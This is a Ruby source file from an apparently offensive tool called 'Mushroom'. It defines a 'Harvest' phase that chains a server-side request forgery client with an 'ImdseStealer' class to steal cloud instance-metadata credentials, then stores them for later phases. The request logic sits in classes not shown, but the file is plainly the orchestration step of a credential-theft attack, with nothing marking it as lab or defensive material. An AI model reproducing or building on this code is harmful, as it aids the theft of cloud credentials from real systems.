# frozen_string_literal: true

module Mushroom
  module Phases
    # Phase 2 – Harvest
    # SSRF → IMDS credential theft.
    class Harvest < Phase
      def execute
        ssrf_client = Mushroom::Harvest::SsrfClient.new(
          ssrf_endpoint: config[:ssrf_endpoint],
          config: config,
          logger: logger
        )

        stealer = Mushroom::Harvest::ImdseStealer.new(config: config, logger: logger)
        creds   = stealer.steal(ssrf_client: ssrf_client)

        context.credentials = creds
        logger.info('harvest: phase complete', redacted: creds.redacted)
      end
    end
  end
end
